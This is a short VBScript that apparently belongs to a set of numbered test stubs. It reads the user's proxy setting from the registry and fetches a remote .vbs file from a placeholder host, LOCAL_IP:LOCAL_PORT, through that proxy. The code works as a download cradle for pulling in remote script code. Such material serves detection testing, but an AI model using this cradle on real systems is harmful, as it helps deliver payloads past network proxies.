Dim objShell, url, WshShell, regvalue
Set WshShell = WScript.CreateObject("Wscript.Shell")
regvalue = WshShell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer")
url = "http://LOCAL_IP:LOCAL_PORT/HTTP_12_serverxmlhttp_p.vbs"
Set objShell = WScript.CreateObject("MSXML2.ServerXMLHTTP")
objShell.open "GET", url, false
objShell.setProxy 2, regvalue
objShell.send